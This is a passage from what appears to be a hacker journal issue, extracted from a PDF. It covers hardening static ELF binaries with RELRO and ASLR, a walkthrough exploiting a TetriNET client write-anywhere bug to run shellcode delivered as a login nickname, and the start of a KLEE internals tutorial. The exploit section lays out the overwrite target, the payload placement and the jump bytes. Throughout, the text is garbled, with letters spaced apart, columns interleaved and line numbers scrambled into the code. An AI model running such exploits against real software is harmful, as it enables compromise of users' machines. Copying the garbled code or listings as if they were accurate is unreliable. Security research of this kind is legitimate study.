S t a r t i t from t h e b e g i n n i n g ? ( y o r n ) y
S t a r t i n g program : /home/ e l f m a s t e r / g i t / l i b e l f m a s t e r / examples / s t a t i c _ b i n a r y
Hardware w a t c h p o i n t 4 : ∗0 x6d0020
Old v a l u e = 4195078
New v a l u e = 4418976
0 x0000000000404dd3 i n g e n e r i c _ s t a r t _ m a i n ( )
( gdb ) x/ i 0 x436da0
0 x436da0 <__memmove_avx_unaligned>: mov
( gdb ) c
Continuing .
%r d i ,% r a x
Hardware w a t c h p o i n t 3 : ∗0 x6d0018
Old v a l u e = 4195062
New v a l u e = 4453888
0 x0000000000404dd3 i n g e n e r i c _ s t a r t _ m a i n ( )
( gdb ) x/ i 0 x 4 3 f 6 0 0
0 x 4 3 f 6 0 0 <__strcpy_sse2_unaligned >: mov
( gdb )
%r s i ,% r c x
Figure 19. Exploring a Static ELF with GDB
40A Second Implementation
ing subsequent instructions. Nonetheless this is the
prototype we are stuck with until I have time to
make some changes.
–——–
———
—–—–
So let’s take a look at this RelroS application. 32
33
First we see that this is not a dynamically linked
executable.
My first prototype had to be written quickly due to
time constraints. This current implementation uses
an injection technique that marks the PT_NOTE pro-
gram header as PT_LOAD, and we therefore create a
second text segment effectively.
In the generic_start_main() function (Fig-
ure 20) there is a very specific place that we must
patch and it requires exactly a five byte patch. (call
<imm>.) As immediate calls do not work when trans-
ferring execution to a different segment, an lcall
(far call) is needed which is considerably more than
five bytes. The solution to this is to switch to a
reverse text infection which will keep the enable_-
relro() code within the one and only code segment.
Currently though we are being crude and patching
the code that calls main().
Currently we are overwriting six bytes at
0x405b54 with a push $enable_relro; ret set
of instructions, shown in Figure 21.
Our
enable_relro() function mprotects the part of the
data segment denoted by PT_RELRO as read-only,
then calls main(), then sys_exits. This is flawed
since none of the deinitilization routines get called.
So what is the solution?
Like I mentioned earlier, we keep the
enable_relro() code within the main programs
text segment using a reverse text extension, or a text
padding infection. We could then simply overwrite
the five bytes at 0x405b46 with a call <offset>
to enable_relro() and then that function would
make sure we return the address of main() which
would obviously be stored in %rax. This is perfect
since the next instruction is callq *%rax, which
would call main() right after RELRO has been en-
abled, and no instructions are thrown out of align-
ment. So that is the ideal solution, although it
doesn’t yet handle the problem of .tdata being
at the beginning of the data segment, which is a
problem for us since we can only use mprotect on
memory areas that are multiples of a PAGE_SIZE.
A more sophisticated set of steps must be taken
in order to get multi-threaded applications working
with RELRO using binary instrumentation. Other
solutions might use linker scripts to put the thread
data and bss into their own data segment.
Notice how we patch the instruction bytes start-
ing at 0x405b4f with a push/ret sequence, corrupt-
$ r e a d e l f −d t e s t
There i s no dynamic s e c t i o n i n t h i s
file .
We observe that there is only a r+x text seg-
ment, and a r+w data segment, with a lack of read-
only memory protections on the first part of the data
segment.
$ ./ test &
[ 1 ] 27891
$ c a t / p r o c / ‘ p i d o f t e s t ‘ / maps
00400000 −004 c c 0 0 0 r−xp 00000000 f d : 0 1
4856460 /home/ e l f m a s t e r / t e s t
006 cc000 −006 c f 0 0 0 rw−p 000 c c 0 0 0 f d : 0 1
4856460 /home/ e l f m a s t e r / t e s t
...
We apply RelroS to the executable with a single
command.
$ ./ relros ./ test
i n j e c t i o n s i z e : 464
main ( ) : 0 x400b23
We observe that read-only relocations have been
enforced by our patch that we instrumented into the
binary called test.
$ ./ test &
[ 1 ] 28052
$ c a t / p r o c / ‘ p i d o f t e s t ‘ / maps
00400000 −004 c c 0 0 0 r−xp 00000000 f d : 0 1
10486089 /home/ e l f m a s t e r / t e s t
006 cc000 −006 cd000 r−−p 000 c c 0 0 0 f d : 0 1
10486089 /home/ e l f m a s t e r / t e s t
006 cd000 −006 c f 0 0 0 rw−p 000 cd000 f d : 0 1
10486089 /home/ e l f m a s t e r / t e s t
...
Notice after we applied relros on ./test, it now
has a 4096 area in the data segment that has been
marked as read-only. This is what the dynamically
linker accomplishes for dynamically linked executa-
bles.
32 Please note that it uses libelfmaster which is not officially released yet. The use of this library is minimal, but you will
need to rewrite those portions if you intend to run the code.
33 unzip pocorgtfo18.pdf relros.c
41405 b46 :
405 b4b :
405 b 4 f :
405 b54 :
405 b56 :
405 b58 :
48
8b
48
ff
89
e8
8b
7c
8b
d0
c7
b3
74 24 10
24 0 c
44 24 18
de 00 00
mov
mov
mov
callq
mov
callq
0 x10(% r s p ) ,% r s i
0 xc(% r s p ) ,% e d i
0 x18(% r s p ) ,% r a x /∗ s t o r e main ( ) addr ∗/
∗%r a x /∗ c a l l main ( ) ∗/
%eax ,% e d i
413 a10 <e x i t >
Figure 20. Unpatched generic_start_main().
405 b46 :
48 8b 74 24 10
mov
0 x10(% r s p ) ,% r s i
405 b4b :
8b 7 c 24 0 c
mov
0 xc(% r s p ) ,% e d i
405 b 4 f :
48 8b 44 24 18
mov
0 x18(% r s p ) ,% r a x
405 b54 :
68 f 4 c6 0 f 0 c
pushq $ 0 x c 0 f c 6 f 4
405 b59 :
c3
retq
/∗
∗ The f o l l o w i n g bad i n s t r u c t i o n s a r e n e v e r c r a s h e d on b e c a u s e
∗ t h e p r e v i o u s i n s t r u c t i o n r e t u r n s i n t o e n a b l e _ r e l r o ( ) which c a l l s
∗ main ( ) on b e h a l f o f t h i s f u n c t i o n , and t h e n s y s _ e x i t ’ s o u t .
∗/
405 b5a :
de 00
f i a d d (%r a x )
405 b5c :
00 39
add
%bh ,(% r c x )
405 b5e :
c2 0 f 86
retq
$0x860f
405 b61 :
fb
sti
405 b62 :
fe
( bad )
405 b63 :
ff
( bad )
405 b64 :
ff
( bad )
Figure 21. Patched generic_start_main().
42ASLR Solutions
–——–
———
—–—–
So what are some other potential solutions for
enabling RELRO on statically linked executables?
Aside from my binary instrumentation project that
will improve in the future, this might be fixed either
by tricky linker scripts or by the glibc developers.
Write a linker script that places .tbss,
.tdata, and .data in their own segment and
the sections that you want readonly should be
placed in another segment, these sections include
.init_array, .fini_array, .jcr, .dynamic, .got,
and .got.plt. Both of these PT_LOAD segments will
be marked as PF_R|PF_W (read+write), and serve as
two separate data segments. A program can then
have a custom function–but not a constructor–that
is called by main() before it even checks argc and
argv. The reason we don’t want a constructor func-
tion is because it will attempt to mprotect read-
only permissions on the second data segment before
the glibc init code has finished performing its fixups
which require write access. This is because the con-
structor routines stored in .init section are called
before the write instructions to the .got, .got.plt
sections, etc.
The glibc developers should probably add a
function that is invoked by generic_start_main()
right before main() is called. You will notice there
is a _dl_protect_relro() function in statically
linked executables that is never called.
I haven’t personally spent enough time with the
linker to see if it can be tweaked to link a static
executable that comes out as an ET_DYN object,
which should also not have a PT_INTERP segment
since it is not dynamically linked. A quick peak in
src/linux/fs/binfmt_elf.c, shown in Figure 22,
will show that the executable type must be ET_DYN.
A Hybrid Solution
The linker may not be able to perform this task yet,
but I believe we can. A potential solution exists
in the idea that we can at least compile a stati-
cally linked executable so that it uses position in-
dependent code (IP relative), although it will still
maintain an absolute address space. So here is the
algorithm as follows from a binary instrumentation
standpoint.
First we’ll compile the executable with
-static -fPIC, then static_to_dyn.c ad-
justs the executable.
First it changes the
ehdr->e_type from ET_EXEC to ET_DYN. It then
modifies the phdrs for each PT_LOAD segment,
setting phdr[TEXT].p_vaddr and .p_offset
to zero, phdr[DATA].p_vaddr to 0x200000 +
phdr[DATA].p_offset. It sets ehdr->e_entry to
ehdr->e_entry - old_base. Finally, it updates
each section header to reflect the new address range,
so that GDB and objdump can work with the bi-
nary.
ASLR Issues
$ g c c − s t a t i c −fPIC t e s t 2 . c −o t e s t 2
$ . / static_to_dyn . / t e s t 2
S e t t i n g e_entry t o 8 b0
$ ./ test2
S e g m e n t a t i o n f a u l t ( c o r e dumped )
ASLR requires that an executable is ET_DYN unless
VMA mirroring is used for ET_EXEC ASLR. A stat-
ically linked executable can only be linked as an
ET_EXEC type executable.
$ g c c − s t a t i c −fPIC −p i e t e s t 2 . c −o t e s t 2
l d : x86_64−l i n u x −gnu /5/ c r t b e g i n T . o :
r e l o c a t i o n R_X86_64_32 a g a i n s t ‘__TMC_END__’
can not be used when making a s h a r e d o b j e c t ;
r e c o m p i l e with −fPIC
x86_64−l i n u x −gnu /5/ c r t b e g i n T . o : e r r o r a dd in g
symbols : Bad v a l u e
c o l l e c t 2 : error : ld returned 1 exit status
Alas, a quick look at the binary with objdump
will prove that most of the code is not using IP rel-
ative addressing and is not truly PIC. The PIC ver-
sion of the glibc init routines like _start lives in
/usr/lib/X86_64-linux-gnu/Scrt1.o, so we may
have to start thinking outside the box a bit about
what a statically linked executable really is. That is,
we might take the -static flag out of the equation
and begin working from scratch!
Perhaps test2.c should have both a
_start() and a main(), as shown in Figure 23.
_start() should have no code in it and use
__attribute__((weak)) so that the _start() rou-
tine in Scrt1.o can override it. Or we can compile
This means that you can remove the -pie flag
and end up with an executable that uses position
independent code. But it does not have an address
space layout that begins with base address 0, which
is what we need. So what to do?
43916
918
920
922
} e l s e i f ( l o c −>e l f _ e x . e_type == ET_DYN) {
/∗ Try and g e t dynamic programs o u t o f t h e way o f t h e
∗ d e f a u l t mmap base , as w e l l as w h a t e v e r program t h e y
∗ might t r y t o e x e c .
This i s b e c a u s e t h e b r k w i l l
∗ f o l l o w t h e l o a d e r , and i s n o t movable . ∗/
l o a d _ b i a s = ELF_ET_DYN_BASE − vaddr ;
i f ( c u r r e n t −>f l a g s & PF_RANDOMIZE)
l o a d _ b i a s += arch_mmap_rnd ( ) ;
if
942
944
946
948
950
( ! load_addr_set ) {
load_addr_set = 1 ;
load_addr = ( e l f _p p n t −>p_vaddr − e lf _ p pn t −>p _ o f f s e t ) ;
i f ( l o c −>e l f _ e x . e_type == ET_DYN) {
l o a d _ b i a s += e r r o r −
ELF_PAGESTART( l o a d _ b i a s + vaddr ) ;
load_addr += l o a d _ b i a s ;
reloc_func_desc = load_bias ;
}
}
Figure 22. src/linux/fs/binfmt_elf.c
Diet Libc 34 with IP relative addressing, using it
instead of glibc for simplicity. There are multi-
ple possibilities, but the primary idea is to start
thinking outside of the box. So for the sake of a
PoC here is a program that simply does nothing
but check if argc is larger than one and then incre-
ments a variable in a loop every other iteration. We
will demonstrate how ASLR works on it. It uses
_start() as its main(), and the compiler options
will be shown below.
$ . / static_to_dyn t e s t 2
$ . / t e s t 2 arg1
$ pmap ‘ p i d o f t e s t 2 ‘
17622:
. / t e s t 2 arg1
0000565271 e 41 00 0
4K
0000565272042000
4K
00007 f f c 2 8 f d a 0 0 0
132K
00007 f f c 2 8 f f c 0 0 0
8K
00007 f f c 2 8 f f e 0 0 0
8K
ffffffffff600000
4K
total
160K
r−x−− t e s t 2
rw−−− t e s t 2
rw−−−
[ stack ]
r−−−−
[ anon ]
r−x−−
[ anon ]
r−x−−
[ anon ]
$ g c c −n o s t d l i b −fPIC t e s t 2 . c −o t e s t 2
$ . / t e s t 2 arg1
$ pmap ‘ p i d o f t e s t 2 ‘
17370:
. / t e s t 2 arg1
0000000000400000
4K
0000000000601000
4K
00007 f f c e f c c a 0 0 0
132K
00007 f f c e f d 2 0 0 0 0
8K
00007 f f c e f d 2 2 0 0 0
8K
ffffffffff600000
4K
total
160K
$
Now notice that the text and data segments for
test2 are mapped to a random address space. Now
we are talking! The rest of the homework should be
fairly straight forward. Extrapolate upon this work
and find more creative solutions until the GNU folks
have the time to address the issues with some more
elegance than what we can do using trickery and
instrumentation.
r−x−− t e s t 2
rw−−− t e s t 2
rw−−−
[ stack ]
r−−−−
[ anon ]
r−x−−
[ anon ]
r−x−−
[ anon ]
ASLR is not present, and the address space is
just as expected on a 64 class ELF binary in Linux.
So let’s run static_to_dyn.c on it, and then try
again.
34 unzip
pocorgtfo18.pdf dietlibc.tar.bz2
441 /∗ Make s u r e we have a d a t a segment f o r t e s t i n g p u r p o s e s ∗/
s t a t i c i n t test_dummy = 5 ;
3
int _start ( ) {
5
int argc ;
long ∗ a r g s ;
7
long ∗ rbp ;
int i ;
9
int j = 0 ;
/∗ E x t r a c t a r g c from s t a c k ∗/
asm __volatile__ ( "mov 8(%%rbp ) , %%r c x " : "=c " ( a r g c ) ) ;
11
13
/∗ E x t r a c t a r g v from s t a c k ∗/
asm __volatile__ ( " l e a 16(%%rbp ) , %%r c x " : "=c " ( a r g s ) ) ;
15
17
i f ( argc > 2) {
f o r ( i = 0 ; i < 1 0 0 0 0 0 0 0 0 0 0 0 ; i ++)
i f ( i % 2 == 0 )
j ++;
}
return 0 ;
19
21
23 }
Figure 23. First Draft of test2.c
Improving Static Linking Techniques
Now we can run static_to_dyn from Figure 25
to enforce ASLR. 36 The first two sections are hap-
pily randomized!
Since we are compiling statically by simply cutting
glibc out of the equation with the -nostdlib com-
piler flag, we must consider that things we take for
granted, such as TLS and system call wrappers,
must be manually coded and linked. One potential
solution I mentioned earlier is to compile dietlibc
with IP relative addressing mode, and simply link
your code to it with -nostdlib. Figure 24 is an up-
dated version of test2.c which prints the command
line arguments.
Now we are actually building a statically linked
binary that can get command line args, and call stat-
ically linked in functions from Diet Libc. 35
$ . / static_to_dyn t e s t 2
$ . / t e s t 2 f o o bar
$ pmap ‘ p i d o f t e s t ‘
24411:
. / t e s t 2 f o o bar
0000564 c f 5 4 2 f 0 0 0
8K
0000564 c f 5 6 3 1 0 0 0
4K
00007 f f e 9 8 c 8 e 0 0 0
132K
00007 f f e 9 8 d 5 5 0 0 0
8K
00007 f f e 9 8 d 5 7 0 0 0
8K
ffffffffff600000
4K
total
164K
r−x−− t e s t 2
rw−−− t e s t 2
rw−−−
[ stack ]
r−−−−
[ anon ]
r−x−−
[ anon ]
r−x−−
[ anon ]
$ g c c −n o s t d l i b −c −fPIC t e s t 2 . c −o t e s t 2 . o
$ g c c −n o s t d l i b t e s t 2 . o \
/ u s r / l i b / d i e t / l i b −x86_64/ l i b c . a −o t e s t 2
$ . / t e s t 2 arg1 arg2
./ test2
arg1
arg2
$
35 Note that first I downloaded the dietlibc source code and edited the Makefile to use the -fPIC flag which will enforce
IP-relative addressing within dietlibc.
36 unzip pocorgtfo18.pdf static_to_dyn.c
45#include <s t d i o . h>
2
/∗ Make s u r e we have a d a t a segment f o r t e s t i n g p u r p o s e s ∗/
4 s t a t i c i n t test_dummy = 5 ;
6 int _start ( ) {
int argc ;
8
long ∗ a r g s ;
long ∗ rbp ;
10
int i ;
int j = 0 ;
12
/∗ E x t r a c t a r g c from s t a c k ∗/
14
asm __volatile__ ( "mov 8(%%rbp ) , %%r c x " : "=c " ( a r g c ) ) ;
/∗ E x t r a c t a r g v from s t a c k ∗/
asm __volatile__ ( " l e a 16(%%rbp ) , %%r c x " : "=c " ( a r g s ) ) ;
16
18
f o r ( i = 0 ; i < a r g c ; i ++) {
s l e e p ( 1 0 ) ; /∗ l o n g enough f o r us t o v e r i f y ASLR ∗/
p r i n t f ( "%s \n" , a r g s [ i ] ) ;
}
exit (0) ;
20
22
24 }
Figure 24. Updated test2.c.
Summary
In this paper we have cleared some misconceptions
surrounding the attack surface of a statically linked
executable, and which security mitigations are lack-
ing by default. PLT/GOT attacks do exist against
statically linked ELF executables, but RELRO and
ASLR defenses do not.
We presented a prototype tool for enabling full
RELRO on statically linked executables. We also
engaged in some work to create a hybridized ap-
proach between linking techniques with instrumen-
tation, and together were able to propose a solution
for making static binaries that work with ASLR.
Our solution for ASLR is to first build the binary
statically, without glibc.
461 #d e f i n e _GNU_SOURCE
#i n c l u d e < s t d i o . h>
3 #i n c l u d e < s t d l i b . h>
#i n c l u d e < e l f . h>
5 #i n c l u d e <s y s / t y p e s . h>
#i n c l u d e <s e a r c h . h>
7 #i n c l u d e <s y s / t i m e . h>
#i n c l u d e < f c n t l . h>
9 #i n c l u d e < l i n k . h>
#i n c l u d e <s y s / s t a t . h>
11 #i n c l u d e <s y s /mman . h>
13 #d e f i n e HUGE_PAGE 0 x 2 0 0 0 0 0
15
17
19
21
23
25
i n t main ( i n t a r g c , char ∗∗ a r g v ) {
ElfW ( Ehdr ) ∗ e h d r ;
ElfW ( Phdr ) ∗ phdr ;
ElfW ( Shdr ) ∗ s h d r ;
u i n t 8 _ t ∗mem ;
int fd ;
int i ;
struct s t a t s t ;
u i n t 6 4 _ t o l d _ b a s e ; /∗ o r i g i n a l t e x t
u i n t 6 4 _ t new_data_base ; /∗ new d a t a
char ∗ S t r i n g T a b l e ;
27
base
base
∗/
∗/
f d = open ( a r g v [ 1 ] , O_RDWR) ;
i f ( fd < 0) {
p e r r o r ( " open " ) ;
goto f a i l ;
}
29
31
33
f s t a t ( f d , &s t ) ;
35
mem = mmap(NULL, s t . s t _ s i z e , PROT_READ|PROT_WRITE, MAP_SHARED,
i f (mem == MAP_FAILED ) {
p e r r o r ( "mmap" ) ;
goto f a i l ;
}
37
39
fd ,
0) ;
e h d r = ( ElfW ( Ehdr ) ∗ )mem ;
phdr = ( ElfW ( Phdr ) ∗ )&mem [ e h d r− >e _ p h o f f ] ;
s h d r = ( ElfW ( Shdr ) ∗ )&mem [ e h d r− >e _ s h o f f ] ;
S t r i n g T a b l e = ( char ∗ )&mem [ s h d r [ e h d r− >e _ s h s t r n d x ] . s h _ o f f s e t ] ;
41
43
45
p r i n t f ( " Marking e_type
e h d r− >e_type = ET_DYN;
47
49
t o ET_DYN\ n " ) ;
p r i n t f ( " U p d a t i n g PT_LOAD s e g m e n t s t o become r e l o c a t a b l e f r o m b a s e 0\ n " ) ;
f o r ( i = 0 ; i < e h d r− >e_phnum ; i ++) {
i f ( phdr [ i ] . p_type == PT_LOAD && phdr [ i ] . p _ o f f s e t == 0 ) {
o l d _ b a s e = phdr [ i ] . p_vaddr ;
phdr [ i ] . p_vaddr = 0UL ;
phdr [ i ] . p_paddr = 0UL ;
phdr [ i + 1 ] . p_vaddr = HUGE_PAGE + phdr [ i + 1 ] . p _ o f f s e t ;
phdr [ i + 1 ] . p_paddr = HUGE_PAGE + phdr [ i + 1 ] . p _ o f f s e t ;
} e l s e i f ( phdr [ i ] . p_type == PT_NOTE) {
phdr [ i ] . p_vaddr = phdr [ i ] . p _ o f f s e t ;
phdr [ i ] . p_paddr = phdr [ i ] . p _ o f f s e t ;
} e l s e i f ( phdr [ i ] . p_type == PT_TLS) {
phdr [ i ] . p_vaddr = HUGE_PAGE + phdr [ i ] . p _ o f f s e t ;
phdr [ i ] . p_paddr = HUGE_PAGE + phdr [ i ] . p _ o f f s e t ;
new_data_base = phdr [ i ] . p_vaddr ;
}
}
/∗
∗ I f we don ’ t u p d a t e t h e s e c t i o n h e a d e r s t o r e f l e c t t h e new a d d r e s s
∗ s p a c e t h e n GDB and objdump w i l l b e b r o k e n w i t h t h i s b i n a r y .
∗/
f o r ( i = 0 ; i < e h d r− >e_shnum ; i ++) {
i f ( ! ( s h d r [ i ] . s h _ f l a g s & SHF_ALLOC) )
continue ;
s h d r [ i ] . sh_addr = ( s h d r [ i ] . sh_addr < o l d _ b a s e + HUGE_PAGE)
? 0UL + s h d r [ i ] . s h _ o f f s e t
: new_data_base + s h d r [ i ] . s h _ o f f s e t ;
p r i n t f ( " S e t t i n g %s sh_addr t o %#l x \ n " , &S t r i n g T a b l e [ s h d r [ i ] . sh_name ] , s h d r [ i ] . sh_addr ) ;
}
p r i n t f ( " S e t t i n g new e n t r y p o i n t : %#l x \ n " , e h d r− >e _ e n t r y − o l d _ b a s e ) ;
e h d r− >e _ e n t r y = e h d r− >e _ e n t r y − o l d _ b a s e ;
munmap (mem, s t . s t _ s i z e ) ;
exit (0) ;
fail :
e x i t ( −1) ;
51
53
55
57
59
61
63
65
67
69
71
73
75
77
79
81
83
}
Figure 25. static_to_dyn.c
4718:07
A Trivial Exploit for TetriNET; or,
Update Player TranslateMessage to Level Shellcode.
by John Laky and Kyle Hanslovan
Lo, the year was 1997 and humanity com-
pletes its greatest feat yet—nearly thirty years af-
ter NASA delivers the lunar landings, St0rmCat
releases TetriNET, a gritty multiplayer reboot of
the gaming monolith Tetris, bringing capitalists and
communists together in competitive, adrenaline-
pumping, line-annihilating, block-crushing action,
all set to a period-appropriate synthetic soundtrack
that would make Gorbachev blush. TetriNET holds
the dubious distinction of hosting one of the most hi-
larious bugs ever discovered, where sending a offset
and overwritable address in a stringified game state
update will jump to any address of our choosing.
The TetriNET protocol is largely a trusted two-
way ASCII-based message system with a special
binascii encoded handshake for login. 37 Although
there is an official binary (v1.13), this protocol en-
joyed several implementations that aid in its reverse
engineering, including a Python server/client imple-
mentation. 38 Authenticating to a TetriNET server
using a custom encoding scheme, a rotating xor de-
rived from the IP address of the server. One could
spend ages reversing the C++ binary for this algo-
rithm, but The Great Segfault punishes wasted time
and effort, and our brethren at Pytrinet already
have a Python implementation.
# login string looks li k e
2 # ‘ ‘ < n i c k > <v e r s i o n > <s e r v e r i p > ’ ’
# ex : TestUser 1 . 1 3 1 2 7 . 0 . 0 . 1
4 def en co de ( n i c k , v e r s i o n , i p ) :
dec = 2
6
s = ’ t e t r i s s t a r t %s %s ’ % ( n i c k , v e r s i o n )
h = s t r ( 5 4 ∗ i p [ 0 ] + 41∗ i p [ 1 ]
8
+ 29∗ i p [ 2 ] + 17∗ i p [ 3 ] )
encodeS = dec2hex ( dec )
10
f o r i in range ( len ( s ) ) :
12
dec = ( ( dec + ord ( s [ i ] ) ) % 2 5 5 )
^ ord ( h [ i % len ( h ) ] )
14
s 2 = dec2hex ( dec )
encodeS += s 2
16
return encodeS
One of the many updates a TetriNET client can
send to the server is the level update, an 0xFF ter-
minated string of the form:
1 l v l <p l a y e r number> < l e v e l number>\ x f f
The documentation states acceptable values for
the player number range 1-6, a caveat that should
pique the interest of even nascent bit-twiddlers. Pre-
dictably, sending a player number of 0x20 and a level
of 0x00AABBCC crashes the binary through a write-
anywhere bug. The only question now is which is
easier: overwriting a return address on a stack or a
stomping on a function pointer in a v-table or some-
thing. A brief search for the landing zone yields the
answer:
1
3
37 unzip
pocorgtfo18.pdf iTetrinet-wiki.zip
38 http://pytrinet.ddmr.nl/
48
00454314:
00454328:
0045433 c :
77 f 1 e c c e
00 a a b b c c
7 e43ee5d
77 f 1 a d 2 3
77 f 2 7 0 9 0
7 e41940c
77 f 1 5 f e 0
77 f 1 6 f 7 9
7 e44faf5
77 f 1 7 0 0 a
00000000
7 e42fbbd
77 f 1 d 9 6 9
7 e429766
7 e42aeabPraise the Stack! We landed inside the import
table.
1
3
5
7
9
11
13
15
17
sub_424620
2 sub_424620
sub_424620
. idata :00454324
4
sub_424620
; HBRUSH _ _ s t d c a l l
sub_424620
;
C r e a t e B r u s h I n d i r e c t ( const LOGBRUSH ∗ )
6 sub_424620
e x t r n __imp_CreateBrushIndirect : dword
sub_424620+1
;DATA XREF: C r e a t e B r u s h I n d i r e c t r
8 sub_424620+2
sub_424620+5
. idata :00454328
10 sub_424620+7
; HBITMAP _ _ s t d c a l l
sub_424620+9
;
CreateBitmap ( int , int , UINT , UINT ,
12
sub_424620+B
;
const void ∗ )
sub_424620+D
e x t r n __imp_CreateBitmap : dword
14 sub_424620+F
; DATA XREF: CreateBitmapr
sub_424620+11
16 sub_424620+15
. i d a t a : 0 0 4 5 4 3 2C
sub_424620+16
; HENHMETAFILE _ _ s t d c a l l
;
CopyEnhMetaFileA (HENHMETAFILE, LPCSTR) 18 sub_424620+1B
...
e x t r n __imp_CopyEnhMetaFileA : dword
20 sub_424620+8E
; DATA XREF: CopyEnhMetaFileAr
sub_424620+92
22 sub_424620+93
sub_424620+98
Now we have a plan to overwrite an often- 24 sub_424620+9C
sub_424620+9D
called function pointer with a useful address, but 26 sub_424620+A2
which one? There are a few good candidates, and
a look at the imports reveals a few of particular
interest: PeekMessageA, DispatchMessageA, and
TranslateMessage, indicating TetriNET relies on
Windows message queues for processing. Because
these are usually handled asynchronously and ap-
plications receive a deluge of messages during nor-
mal operation, these are perfect candidates for cor-
ruption. Indeed, TetriNET implements a Peek-
MessageA / TranslateMessage / DispatchMess-
ageA subroutine.
sub_424620 p r o c n e a r
var_20 = b y t e p t r −20h
Msg = MSG p t r −1Ch
push ebx
push e s i
add esp , 0FFFFFFE0h
mov e s i , eax
x o r ebx , ebx
push 1 ; wRemoveMsg
push 0 ; wMsgFilterMax
push 0 ; wMsgFilterMin
push 0 ; hWnd
l e a eax , [ e s p +30h+Msg ]
push eax ; lpMsg
c a l l PeekMessageA
t e s t eax , eax
l e a eax , [ e s p +20h+Msg ]
push eax ; lpMsg
c a l l TranslateMessage
l e a eax , [ e s p +20h+Msg ]
push eax ; lpMsg
c a l l DispatchMessageA
jmp short loc_4246C8
<< ! !
Adjusting our firing solution to overwrite the ad-
dress of TranslateMessage (remember the vulnera-
ble instruction multiplies the player number by the
size of a pointer; scale the payload accordingly) and
voila! EIP jumps to our provided level number.
Now, all we have to do is jump to some shell-
code. This may be a little trickier than it seems at
first glance.
The first option: with a stable write-anywhere
bug, we could write shellcode into an rwx section
and jump to it. Unfortunately, the level number
that eventually becomes ebx in the vulnerable in-
struction is a signed double word, and only posi-
tive integers can be written without raising an error.
We could hand-craft some clever shellcode that only
uses bytes smaller than 0x80 in key locations, but
there must be a better way.
The second option: we could attempt to write
our shellcode three bytes at a time instead of four,
working backward from the end of an RWX sec-
tion, always writing double words with one positive-
integer-compliant byte followed by three bytes of
shellcode, always overwriting the useless byte of the
last write. Alas, the vulnerable instruction enforces
4-byte aligned writes:
0044 B963 mov ds : dword_453F28 [ eax ∗ 4 ] , ebx
49The third option: we could patch either the
positive-integer-compliant check or the vulnerable
instruction to allow us to perform either of the first
two options. Alas, the page containing this code is
not writable.
trampoline to load that pointer into a register and
jump to it:
0:
2 5:
1 00401000 ; Segment t y p e :
Pure code
00401000 ; Segment perms : Read/ Execute
mov
jmp
eax , ds : 0 x4537bc
eax
Voila! Login as shellcode, update your level to
the trampoline, smash the pointer to Translate-
Message and pull the trigger on the windows mes-
sage pump and rejoice in the shiny goodness of a
running exploit. The Stack would be proud! While
a host of vulnerabilities surely lie in wait betwixt
the subroutines of tetrinet.exe, this vulnerabil-
ity’s shameless affair with the player is truly one for
the ages.
Scripts and a reference tetrinet executable are
attached to this PDF, 39 and the editors of this
fine journal have resurrected the abandoned web-
site, http://tetrinet.us/.
Suddenly, the Stack grants us a brief moment of
clarity in our moment of desperation: because the
login encoding accepts an arbitrary binary string as
the nickname, all manner of shellcode can be passed
as the nickname, all we have to do is find a way to
jump to it. Surely, there must be a pointer some-
where in the data section to the nickname we can
use to jump it. After a brief search, we discover
there is indeed a static value pointing to the login
nickname in the heap. Now, we can write a small
39 unzip
a1 bc 37 45 00
f f e0
pocorgtfo18.pdf tetrinet.zip
5018:08
A Guide to KLEE LLVM Execution Engine Internals
by Julien Vanegue
Greetings fellow neighbors!
It is my great pleasure to finally write my first
article in PoCkGTFO after so many of you have con-
tributed excellent content in the past dozens of is-
sues that Pastor Laphroig put together for our en-
joyment. I have been waiting for this moment for
some time, and been harassed a few times, to fi-
nally come up with something worthwhile. Given
the high standards set upon all of us, I did not feel
like rushing it. Instead, I bring to you today what I
think will be a useful piece of texts for many fellow
hackers to use in the future. Apologies for any er-
rors that may have slipped from my understanding,
I am getting older after all, and my memory is not
what it used to be. Not like it has ever been infail-
lible but at least I used to remember where the cool
kids hung out. This is my attempt at renewing the
tradition of sharing knowledge through some more
informal channels.
Today, I would like to talk to you about KLEE,
an open source symbolic execution engine originally
developed at Stanford University and now main-
tained at Imperial College in London. Symbolic Ex-
ecution (SYMEX) stands somewhere between static
analysis of programs and [dynamic] fuzz testing.
While its theoretical foundations dates back from
the late seventies (King’s paper), practical appli-
cation of it waited until the late 2000s (such as
SAGE 40 at Microsoft Research) to finally become
mainstream with KLEE in 2008. These tools have
been used in practice to find thousands of security
issues in software, going from simple NULL pointer
dereferences, to out of bound reads or writes for
both the heap and the stack, including use-after-
free vulnerabilities and other type-state issues that
can be easily defined using “asserts.”
In one hand, symbolic execution is able to un-
dergo concrete execution of the analyzed program
and maintains a concrete store for variable values as
the execution progresses, but it can also track path
conditions using constraints. This can be used to
verify the feasibility of a specific path. At the same
time, a process tree (PTree) of nodes (PTreeNode)
represent the state space as an ImmutableTree
structure. The ImmutableTree implements a copy-
on-write mechanism so that parts of the state
40 unzip
(mostly variable values) that are shared across the
node don’t have to be copied from state to state un-
less they are written to. This allows KLEE to scale
better under memory pressure. Such state contains
both a list of symbolic constraints that are known to
be true in this state, as well as a concrete store for
program variables on which constraints may or may
not be applied (but that are nonetheless necessary
so the program can execute in KLEE).
My goal in this article is not so much to show
you how to use KLEE, which is well understood,
but bring you a tutorial on hacking KLEE internals.
This will be useful if you want to add features or add
support for specific analysis scenarios that you care
about. I’ve spent hundreds of hours in KLEE inter-
nals and having such notes may have helped me in
the beginning. I hope it helps you too.
Now let’s get started.
Working with Constraints
Let’s look at the simple C program as a motivator.
int f c t ( int a , int b ) {
int c = 0 ;
i f (a < b)
4
c++;
else
6
c −−;
return c ;
8 }
2
10 i n t main ( i n t a r g c , char ∗∗ a r g v ) {
i f ( a r g c != 3 ) return ( −1) ;
12
int a = a t o i ( argv [ 1 ] ) ;
int b = a t o i ( argv [ 2 ] ) ;
14
i f (a < b)
return ( 0 ) ;
16
return f c t ( a , b ) ;
}
It is clear that the path starting in main and con-
tinuing in the first if (a < b) is infeasible. This is
because any such path will actually have finished
with a return (0) in the main function already.
The way KLEE can track this is by listing con-
straints for the path conditions.
This is how it works: first KLEE executes some
bootstrapping code before main takes control, then
pocorgtfo18.pdf automatedwhiteboxfuzzing.pdf
51starts executing the first LLVM instruction of the
main function. Upon reaching the first if statement,
KLEE forks the state space (via function Executor-
::fork). The left node has one more constraint
(argc != 3) while the right node has constraint
(argc == 3). KLEE eventually comes back to its
main routine (Executor::run), adds the newly-
generated states into the set of active states, and
picks up a new state to continue analysis with.
floating point analysis and I tend not to mod-
ify these cases, however this is where to look
if you’re interested in that.
• Alloca: used to allocate memory of a desired
size
